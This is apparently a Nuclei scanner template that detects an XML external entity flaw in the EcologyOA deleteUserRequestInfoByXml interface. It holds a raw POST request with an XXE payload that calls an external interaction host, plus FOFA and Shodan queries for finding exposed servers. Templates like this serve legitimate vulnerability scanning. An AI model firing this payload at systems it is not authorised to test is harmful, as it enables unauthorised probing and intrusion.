http:
- matchers:
  - part: body
    type: word
    words:
    - WfData
  - part: header
    type: word
    words:
    - application/xml
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - 'POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/xml

    Accept-Encoding: gzip


    <?xml version="1.0" encoding="utf-8"?>

    <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">

    <M><syscode>&send;</syscode></M>

    '
id: ecology-oa-byxml-xxe
info:
  author: SleepingBag945
  description: 'EcologyOA deleteUserRequestInfoByXml interface has XXE

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    max-request: 1
    shodan-query: ecology_JSessionid
    verified: true
  name: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
  severity: high
  tags: ecology-oa,xxe
